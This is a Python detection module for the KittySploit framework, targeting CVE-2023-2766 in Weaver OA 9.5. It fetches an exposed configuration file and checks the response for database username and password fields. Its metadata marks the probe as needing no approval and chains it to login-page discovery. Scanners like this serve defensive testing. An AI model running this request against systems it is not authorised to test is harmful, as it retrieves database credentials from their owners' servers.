#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability was found in Weaver OA 9."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Weaver OA 9.5 - Information Disclosure Detection',
        'description': 'A vulnerability was found in Weaver OA 9.5 and classified as problematic. This issue affects some unknown processing of the file /building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini. The manipulation leads to files or directories accessible. The attack may be initiated remotely.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'weaver', 'eoffice', 'exposure', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/8079048q/cve/blob/main/weaveroa.md',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-2766',
            'https://vuldb.com/?ctiid.229271',
            'https://vuldb.com/?id.229271',
            'https://github.com/Vme18000yuan/FreePOC',
        ],
        'cve': 'CVE-2023-2766',
    }

    def run(self):
        r = self.http_request(method="GET", path='/building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('sdbuser =', 'sdbpassword =',)
        header_any = ('text/plain',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="Weaver OA 9.5 - Information Disclosure detected",
                path='/building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini',
            )
            return True
        return False

